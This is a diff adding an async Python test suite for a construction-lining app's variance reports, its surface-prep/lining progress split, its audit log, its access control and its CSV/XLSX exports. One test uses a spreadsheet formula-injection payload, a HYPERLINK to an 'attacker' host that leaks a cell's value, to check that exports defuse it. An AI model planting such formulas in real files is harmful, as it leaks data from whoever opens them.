@@ -15043,6 +15043,278 @@ async def test_execution_workflow():
         await s.commit()
 
 
+# --- Suite CC: variance reporting and the prep/lining split ------------------
+async def test_variance_reporting():
+    """Suite CC — Phase 6. The arithmetic, and the two places it is easy to
+    report a wrong number that looks right.
+
+      1. TOTALS SUM THE ABSOLUTES and derive one percentage from the sums.
+         Averaging the per-entry percentages weights a 2 m² entry the same as a
+         2,000 m² one, which is how a programme that is 8% over reports itself
+         as on target.
+      2. SURFACE PREP IS NOT LINING PROGRESS. Blasting 100 m² of a tank is not
+         100 m² of lining done, and `sme_sqm_progress.Done_SQM` drives
+         Completion_Pct, SQM_Achievable_Now and the buy list.
+    """
+    from sqlalchemy import text as _sqt
+
+    from .services import execution as X
+
+    await _qsep_seed_users()
+    transport = ASGITransport(app=app)
+
+    async with SessionLocal() as s:
+        await s.execute(_sqt("DELETE FROM sme_execution_entry WHERE "
+                             "\"Equipment_Tag_No\" LIKE 'SVCC-%'"))
+        await s.execute(_sqt("DELETE FROM sme_surface_prep_progress WHERE "
+                             "\"Equipment_Tag_No\" LIKE 'SVCC-%'"))
+        await s.execute(_sqt("DELETE FROM sme_sqm_progress WHERE "
+                             "\"Equipment_Tag_No\" LIKE 'SVCC-%'"))
+        await s.execute(_sqt('DELETE FROM sme_recipe WHERE '
+                             "\"Lining_System_Code\" = 'SVCC-LSC'"))
+        await s.execute(_sqt('DELETE FROM sme_manpower_norm WHERE '
+                             "\"Lining_System_Code\" IN ('SVCC-LSC','SVCC-PREP')"))
+        await s.execute(_sqt(
+            'INSERT INTO sme_recipe ("Lining_System_Code", '
+            '"Execution_Sub_Activity_Code", "Material_Code", "SAP_Code", '
+            '"For_1_SQM") VALUES (\'SVCC-LSC\', \'SVCC-ESC\', \'SVCC-MAT\', '
+            '\'SVCC-SAP\', 2.0)'))
+        for lsc, esc, act, crew, mh, prod in (
+                ("SVCC-LSC", "SVCC-ESC", "svcc lining", 4, 44, 100),
+                ("SVCC-PREP", "SVCC-BLAST", "svcc blasting", 2, 22, 40)):
+            await s.execute(_sqt(
+                'INSERT INTO sme_manpower_norm ("Type", "Lining_System_Code", '
+                '"Execution_Sub_Activity_Code", "Activity", "Variant_Key", '
+                '"Crew_Size", "Hours_Per_Shift", "Manhours_Per_Shift", '
+                '"Standard_Productivity_Per_Shift", "SQM_Per_Hour_Per_Person") '
+                "VALUES ('CV', :l, :e, :a, '', :c, 11, :m, :p, 2.0)"),
+                {"l": lsc, "e": esc, "a": act, "c": crew, "m": mh, "p": prod})
+        # An equipment row so surface-prep coverage has a denominator.
+        await s.execute(_sqt(
+            'INSERT INTO sme_equipment ("Site_ID", "Equipment_Tag_No", '
+            '"Lining_System_Code", "Surface_Area_SQM") VALUES '
+            "('CNCEC', 'SVCC-T2', 'SVCC-LSC', 200) "
+            'ON CONFLICT ("Site_ID", "Equipment_Tag_No", "Lining_System_Code") '
+            "DO UPDATE SET \"Surface_Area_SQM\" = 200"))
+        await s.commit()
+
+    async with AsyncClient(transport=transport, base_url="http://svc") as ac:
+        Hsk = await _qsep_login(ac, "SVCQ-sk")
+        Hsup = await _qsep_login(ac, "SVCQ-sup")
+        Hhod = await _qsep_login(ac, "SVCQ-hod")
+
+        async def _lining(tag, sqm, qty):
+            o = await ac.post("/execution/entries", headers=Hsk, json={
+                "work_date": "2026-08-19", "equipment_tag": tag,
+                "lining_system_code": "SVCC-LSC",
+                "execution_sub_activity_code": "SVCC-ESC",
+                "materials": [{"Material_Code": "SVCC-MAT",
+                               "SAP_Code": "SVCC-SAP", "Actual_Qty": qty,
+                               "UOM": "KG"}]})
+            eid = o.json()["id"]
+            await ac.post(f"/execution/entries/{eid}/submit", headers=Hsk)
+            await ac.post(f"/execution/entries/{eid}/supervisor", headers=Hsup,
+                          json={"actual_sqm": sqm,
+                                "manpower": [{"Role_Code": "MASON",
+                                              "Headcount": 4, "Hours": 11}],
+                                "material_variance_reason": "r",
+                                "manpower_variance_reason": "r"})
+            return eid
+
+        # Two entries with DELIBERATELY different sizes, so a percentage-average
+        # and a sum-then-divide give different answers.
+        #   small: 2 m²    → benchmark 4 KG,   actual 8 KG   → +100%
+        #   large: 1000 m² → benchmark 2000 KG, actual 2000 KG → 0%
+        small = await _lining("SVCC-T1", 2, 8)
+        large = await _lining("SVCC-T3", 1000, 2000)
+
+        rep = await ac.get("/execution/report/variance", headers=Hhod)
+        check("CC-01 the variance report loads", rep.status_code == 200,
+              f"{rep.status_code} {rep.text[:140]}")
+        body = rep.json()
+        mine = [r for r in body["items"]
+                if str(r["Equipment_Tag_No"]).startswith("SVCC-")]
+        check("CC-02 both entries are reported", len(mine) == 2, str(len(mine)))
+        by_tag = {r["Equipment_Tag_No"]: r for r in mine}
+        check("CC-03 per-entry material variance is right on the small entry",
+              by_tag["SVCC-T1"]["Material_Benchmark"] == 4.0
+              and by_tag["SVCC-T1"]["Material_Variance_Pct"] == 100.0,
+              str(by_tag["SVCC-T1"]))
+        check("CC-04 …and on the large one",
+              by_tag["SVCC-T3"]["Material_Benchmark"] == 2000.0
+              and by_tag["SVCC-T3"]["Material_Variance_Pct"] == 0.0,
+              str(by_tag["SVCC-T3"]))
+
+        # THE CHECK THAT MATTERS: totals must be sum-then-divide.
+        # sums: actual 2008, benchmark 2004 → +0.2%.
+        # averaging the two percentages would give +50%.
+        sub = await ac.get("/execution/report/variance", headers=Hhod,
+                           params={"date_from": "2026-08-19",
+                                   "date_to": "2026-08-19"})
+        tot = sub.json()["totals"]
+        check("CC-05 totals SUM the absolutes rather than averaging percentages "
+              "— averaging weights a 2 m² entry like a 1000 m² one",
+              abs(tot["Material_Actual"] - 2008.0) < 1e-6
+              and abs(tot["Material_Benchmark"] - 2004.0) < 1e-6
+              and abs(tot["Material_Variance_Pct"] - 0.2) < 0.01,
+              str(tot))
+
+        # ── surface prep vs lining progress ─────────────────────────────────
+        byp = await ac.post("/execution/entries", headers=Hsup, json={
+            "work_date": "2026-08-19", "equipment_tag": "SVCC-T2",
+            "lining_system_code": "",
+            "execution_sub_activity_code": "SVCC-BLAST"})
+        bid = byp.json()["id"]
+        await ac.post(f"/execution/entries/{bid}/supervisor", headers=Hsup,
+                      json={"actual_sqm": 100,
+                            "manpower": [{"Role_Code": "BLASTER",
+                                          "Headcount": 2, "Hours": 11}],
+                            "material_variance_reason": "n/a",
+                            "manpower_variance_reason": "on benchmark"})
+        await ac.post(f"/execution/entries/{bid}/decision", headers=Hhod,
+                      json={"approve": True})
+
+        async with SessionLocal() as s:
+            prep = (await s.execute(_sqt(
+                'SELECT "Done_SQM" FROM sme_surface_prep_progress WHERE '
+                "\"Equipment_Tag_No\" = 'SVCC-T2'"))).scalar()
+            lining = (await s.execute(_sqt(
+                'SELECT COALESCE(SUM("Done_SQM"), 0) FROM sme_sqm_progress '
+                "WHERE \"Equipment_Tag_No\" = 'SVCC-T2'"))).scalar()
+        check("CC-06 approving blasting posts to SURFACE PREP progress",
+              float(prep or 0) == 100.0, f"prep={prep}")
+        check("CC-07 …and adds NOTHING to lining progress — blasting a tank is "
+              "not lining it, and Done_SQM drives Completion_Pct and the buy "
+              "list", float(lining or 0) == 0.0, f"lining={lining}")
+
+        # …while approving LINING work does post to sme_sqm_progress
+        await ac.post(f"/execution/entries/{large}/decision", headers=Hhod,
+                      json={"approve": True})
+        async with SessionLocal() as s:
+            lin3 = (await s.execute(_sqt(
+                'SELECT "Done_SQM" FROM sme_sqm_progress WHERE '
+                "\"Equipment_Tag_No\" = 'SVCC-T3'"))).scalar()
+            prep3 = (await s.execute(_sqt(
+                'SELECT COUNT(*) FROM sme_surface_prep_progress WHERE '
+                "\"Equipment_Tag_No\" = 'SVCC-T3'"))).scalar()
+        check("CC-08 approving LINING work posts to sme_sqm_progress",
+              float(lin3 or 0) == 1000.0, f"{lin3}")
+        check("CC-09 …and not to surface prep — the split runs both ways",
+              int(prep3 or 0) == 0, f"{prep3}")
+
+        pr = await ac.get("/execution/report/surface-prep", headers=Hhod)
+        pitems = [r for r in pr.json()["items"]
+                  if str(r["Equipment_Tag_No"]).startswith("SVCC-")]
+        check("CC-10 the prep report shows coverage against the equipment's "
+              "OWN area (100 of 200 m² = 50%)",
+              pitems and pitems[0]["Coverage_Pct"] == 50.0,
+              str(pitems[:1]))
+
+        # ── the reason audit log ────────────────────────────────────────────
+        ed = await ac.get(f"/execution/entries/{small}", headers=Hhod)
+        mid = ed.json()["materials"][0]["id"]
+        await ac.post(f"/execution/entries/{small}/decision", headers=Hhod,
+                      json={"approve": True,
+                            "materials": [{"id": mid, "Actual_Qty": 5.0}],
+                            "justification": "recount at the store"})
+        rl = await ac.get("/execution/report/reasons", headers=Hhod)
+        mine_r = [r for r in rl.json()["items"]
+                  if str(r["Equipment_Tag_No"]).startswith("SVCC-")]
+        edited = next((r for r in mine_r if r["hod_edited"]), None)
+        check("CC-11 the reason log carries the HOD's justification",
+              edited is not None
+              and "recount" in str(edited["HOD_Edit_Justification"]),
+              str(edited))
+        check("CC-12 …and the BEFORE→AFTER, not merely that something changed",
+              edited is not None and "8" in str(edited["Changed"])
+              and "5" in str(edited["Changed"]), str(edited and edited["Changed"]))
+
+        # ── RULE 12: the exports defuse free text ───────────────────────────
+        # A supervisor's reason is free text typed by a level-0-adjacent role
+        # and opened in Excel by an HOD — exactly the shape rule 12 exists for.
+        evil = '=HYPERLINK("https://attacker/?"&A1,"Open")'
+        o = await ac.post("/execution/entries", headers=Hsup, json={
+            "work_date": "2026-08-19", "equipment_tag": "SVCC-T4",
+            "lining_system_code": "",
+            "execution_sub_activity_code": "SVCC-BLAST"})
+        vid = o.json()["id"]
+        await ac.post(f"/execution/entries/{vid}/supervisor", headers=Hsup,
+                      json={"actual_sqm": 10,
+                            "manpower": [{"Role_Code": "BLASTER",
+                                          "Headcount": 1, "Hours": 8}],
+                            "material_variance_reason": evil,
+                            "manpower_variance_reason": "ok"})
+        csv_r = await ac.get("/execution/report/variance", headers=Hhod,
+                             params={"format": "csv"})
+        check("CC-13 the CSV export renders", csv_r.status_code == 200,
+              f"{csv_r.status_code} {csv_r.text[:120]}")
+        text_out = csv_r.content.decode("utf-8-sig")
+        check("CC-14 RULE 12 — a formula in a supervisor's reason is DEFUSED "
+              "in the csv export",
+              "'=HYPERLINK" in text_out and '\n=HYPERLINK' not in text_out,
+              [l for l in text_out.splitlines() if "HYPERLINK" in l][:1])
+        # THE RULE-12 TRAP, checked on real output: a negative VARIANCE must
+        # reach the sheet as a number. Defusing it would turn every negative
+        # subtotal into text and silently zero it in a GRAND TOTAL.
+        neg_cells = [c for line in text_out.splitlines() for c in line.split(",")
+                     if c.startswith("-") or c.startswith("'-")]
+        check("CC-15 …and a NUMERIC string is left alone, so negative "
+              "subtotals do not become text (the rule-12 trap)",
+              bool(neg_cells) and not any(c.startswith("'-") for c in neg_cells),
+              str(neg_cells[:6]))
+        from .reports import _defuse
+        check("CC-16 the guard itself: '-5' passes through, '-1+1' is defused",
+              _defuse("-5") == "-5" and _defuse("-1+1") == "'-1+1"
+              and _defuse(-5) == -5, "")
+        xr = await ac.get("/execution/report/variance", headers=Hhod,
+                          params={"format": "xlsx"})
+        check("CC-17 the xlsx export renders through the branded writer",
+              xr.status_code == 200 and xr.content[:2] == b"PK",
+              f"{xr.status_code} {xr.content[:8]!r}")
+        bad = await ac.get("/execution/report/variance", headers=Hhod,
+                           params={"format": "exe"})
+        check("CC-18 an unknown export format is refused", bad.status_code == 422,
+              f"{bad.status_code}")
+
+        # ── RBAC ────────────────────────────────────────────────────────────
+        check("CC-19 a store keeper cannot read the variance report",
+              (await ac.get("/execution/report/variance",
+                            headers=Hsk)).status_code == 403, "")
+        check("CC-20 a supervisor cannot read the reason audit log",
+              (await ac.get("/execution/report/reasons",
+                            headers=Hsup)).status_code == 403, "")
+
+    # ── the pure totals math, without HTTP ──────────────────────────────────
+    flat = X._flatten_for_report({
+        "Actual_SQM": 10, "Bench_Productivity_Per_Shift": 10,
+        "Bench_Manhours_Per_Shift": 20, "Lining_System_Code": "",
+        "materials": [], "manpower": [{"Headcount": 2, "Hours": 10}]})
+    check("CC-21 a system-agnostic row reads '(surface prep)', never a blank "
+          "cell — a blank reads as missing data, and this is a real category",
+          flat["Lining_System_Code"] == "(surface prep)",
+          str(flat["Lining_System_Code"]))
+    check("CC-22 manpower expectation is shifts x man-hours-per-shift "
+          "(10/10 x 20 = 20), and 2 x 10 = 20 actual is 0%",
+          flat["Manpower_Benchmark_Manhours"] == 20.0
+          and flat["Manpower_Actual_Manhours"] == 20.0
+          and flat["Manpower_Variance_Pct"] == 0.0, str(flat))
+
+    async with SessionLocal() as s:
+        await s.execute(_sqt("DELETE FROM sme_execution_entry WHERE "
+                             "\"Equipment_Tag_No\" LIKE 'SVCC-%'"))
+        await s.execute(_sqt("DELETE FROM sme_surface_prep_progress WHERE "
+                             "\"Equipment_Tag_No\" LIKE 'SVCC-%'"))
+        await s.execute(_sqt("DELETE FROM sme_sqm_progress WHERE "
+                             "\"Equipment_Tag_No\" LIKE 'SVCC-%'"))
+        await s.execute(_sqt("DELETE FROM sme_equipment WHERE "
+                             "\"Equipment_Tag_No\" LIKE 'SVCC-%'"))
+        await s.execute(_sqt('DELETE FROM sme_recipe WHERE '
+                             "\"Lining_System_Code\" = 'SVCC-LSC'"))
+        await s.execute(_sqt('DELETE FROM sme_manpower_norm WHERE '
+                             "\"Lining_System_Code\" IN ('SVCC-LSC','SVCC-PREP')"))
+        await s.commit()
+
+
 # --- Suite BX: the 2026-08-13 workflow polish ---------------------------------
 async def test_workflow_polish():
     """Suite BX — the operational refinements of 2026-08-13.
@@ -15764,6 +16036,9 @@ async def main() -> int:
     print("\n CB. The execution workflow — three people, three pieces of "
           "knowledge, and the controls that stop one holding all of it")
     await test_execution_workflow()
+    print("\n CC. Variance reporting — the arithmetic, and the two places a "
+          "wrong number looks right")
+    await test_variance_reporting()
     print("\n BW. The suite's own isolation — 1,400+ checks commit through the "
           "real app, so WHICH database they reach is itself a gate")
     await test_database_isolation()
